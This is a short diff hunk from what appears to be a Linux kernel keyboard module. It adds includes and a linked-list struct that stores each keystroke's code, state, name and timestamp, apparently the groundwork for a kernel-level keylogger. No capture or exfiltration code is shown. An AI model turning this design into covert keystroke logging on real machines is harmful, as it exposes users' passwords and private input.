@@ -8,11 +8,23 @@
 #include <linux/wait.h>
 #include <linux/interrupt.h>
 #include <linux/miscdevice.h>
+#include <linux/time.h>
+#include <linux/slab.h>
 
 #define KEYBOARD_DATA		0x60
 #define KBD_IRQ			1
 #define KBD_SCANCODE_MASK	0x7f
 #define KBD_STATUS_MASK		0x80
+
+typedef struct			s_keylst
+{
+	unsigned char		key;
+	unsigned char		state;
+	char			value;
+	char			name[25];
+	struct tm		time;
+	struct s_keylst		*next;
+}				t_keylst;
 
 unsigned char keyboard_map[128] =
 {
